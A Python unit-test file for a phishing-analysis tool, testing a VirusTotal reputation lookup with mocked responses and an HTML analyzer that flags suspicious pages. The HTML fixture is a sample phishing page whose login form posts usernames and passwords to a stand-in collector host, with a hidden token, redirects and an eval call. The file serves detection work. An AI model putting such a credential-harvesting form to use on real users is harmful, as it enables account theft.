import unittest
from unittest.mock import Mock, patch
from src.analysis.vt_lookup import VirusTotalAnalyzer
from src.analysis.html_analyzer import PhishingHTMLAnalyzer

class TestVirusTotalAnalyzer(unittest.TestCase):
    def setUp(self):
        self.vt_analyzer = VirusTotalAnalyzer("test-api-key")

    @patch('src.analysis.vt_lookup.requests.get')
    def test_url_reputation_check(self, mock_get):
        # Mock successful VT response
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'data': {
                'attributes': {
                    'url': 'http://example.com',
                    'last_analysis_stats': {
                        'harmless': 50,
                        'malicious': 5,
                        'suspicious': 2,
                        'undetected': 10
                    },
                    'reputation': 0,
                    'categories': {},
                    'last_analysis_date': '2024-01-01T00:00:00Z'
                }
            }
        }
        mock_get.return_value = mock_response

        result = self.vt_analyzer.check_url_reputation('http://example.com')
        
        self.assertIsNotNone(result)
        self.assertEqual(result['malicious'], 5)
        self.assertEqual(result['harmless'], 50)
        self.assertIn('confidence_score', result)

    @patch('src.analysis.vt_lookup.requests.get')
    def test_file_reputation_check(self, mock_get):
        # Mock successful VT file response
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'data': {
                'attributes': {
                    'sha256': 'test-sha256',
                    'meaningful_name': 'test.exe',
                    'type_description': 'Windows Executable',
                    'size': 1024,
                    'last_analysis_stats': {
                        'harmless': 40,
                        'malicious': 15,
                        'suspicious': 3,
                        'undetected': 5
                    },
                    'type_tags': ['peexe', 'windows'],
                    'popular_threat_classification': {}
                }
            }
        }
        mock_get.return_value = mock_response

        # Mock file hash calculation
        with patch('src.analysis.vt_lookup.VirusTotalAnalyzer._calculate_file_hash') as mock_hash:
            mock_hash.return_value = 'test-sha256'
            result = self.vt_analyzer.check_file_reputation('/fake/path/file.exe')
        
        self.assertIsNotNone(result)
        self.assertEqual(result['malicious'], 15)
        self.assertEqual(result['type_description'], 'Windows Executable')

class TestHTMLAnalyzer(unittest.TestCase):
    def setUp(self):
        self.suspicious_html = """
        <html>
        <head>
            <meta http-equiv="refresh" content="0;url=http://phishing.com">
        </head>
        <body>
            <form action="http://collector.com" method="post">
                <input type="hidden" name="token" value="secret">
                <input type="text" name="username">
                <input type="password" name="password">
                <input type="submit" value="Login">
            </form>
            <script>
                document.location = "http://tracker.com";
                eval("obfuscated code");
            </script>
            <a href="http://bit.ly/redirect">Click here</a>
        </body>
        </html>
        """

    def test_phishing_analysis(self):
        analyzer = PhishingHTMLAnalyzer(self.suspicious_html)
        results = analyzer.analyze()
        
        # Should detect high risk
        self.assertGreater(results['overall_risk_score'], 50)
        
        # Should detect suspicious elements
        self.assertGreater(len(results['suspicious_elements']), 0)
        
        # Should detect forms
        self.assertGreater(len(results['forms']), 0)
        
        # Should detect hidden inputs
        self.assertGreater(len(results['hidden_inputs']), 0)
        
        # Should detect suspicious scripts
        self.assertGreater(len(results['suspicious_scripts']), 0)

    def test_credential_harvesting_detection(self):
        analyzer = PhishingHTMLAnalyzer(self.suspicious_html)
        results = analyzer.analyze()
        
        credential_checks = results['credential_harvesting_checks']
        self.assertTrue(any('password' in check.lower() for check in credential_checks))

    def test_obfuscation_detection(self):
        analyzer = PhishingHTMLAnalyzer(self.suspicious_html)
        results = analyzer.analyze()
        
        obfuscation_checks = results['obfuscation_checks']
        self.assertTrue(any('eval' in check.lower() for check in obfuscation_checks))

if __name__ == '__main__':
    unittest.main()